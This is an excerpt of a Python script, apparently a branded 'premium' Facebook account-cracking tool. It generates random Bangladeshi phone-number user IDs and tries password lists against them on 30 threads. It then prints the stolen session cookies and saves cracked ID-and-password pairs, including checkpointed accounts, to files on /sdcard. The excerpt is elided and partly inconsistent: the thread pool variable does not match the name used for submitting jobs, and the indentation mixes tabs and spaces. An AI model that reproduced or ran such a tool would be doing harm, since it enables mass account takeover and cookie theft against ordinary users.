...
def o():
    ...
    SAMIR =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if SAMIR == '1':
    	C1()
    if SAMIR == '2':
        C2()
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO FARHAN TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m FARHAN
\033[1;32m[-] GITHUB    :\033[1;32m PYSCO-XD2
\033[1;32m[-] FACEBOOK  :\033[1;32m Md Farhan
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PYSCO BRAND\033[;0m\033[1;91m═══>\033[1;92m """
...
def C2():
    ...
    print('[BD CODE] \033[38;5;46m> \033[1;92m017 - 019 - 018 - 015 - 016 - 011-')
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as FARHAN:
        clear()
        tl = str(len(user))
        ...
        for love  in user:
            ...
            uid = code+love 
            SAMIR.submit(rcrack1,uid,pwx,tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[FARHAN-OK]\033[1;96m[💚]\033[1;92m' +cid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🐸]\033[1;91m = \033[1;92m'+coki+ '')
                print ('\033[1;32m[‎💚]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                cek_apk(session,coki)
                open('/sdcard/FARHAN-PYSCO-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break 
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                ##print('\033[1;96m[FARHAN.CP]\033[1;93m[😪]\033[1;96m'+cid+'='+ps+'\033[1;93m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    print ('')
        	    print('\033[38;5;46m[\033[1;92mFARHAN\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/FARHAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[FARHAN.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SAMIR-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        #sys.stdout.write('\r%s[FARHAN]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[FARHAN]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
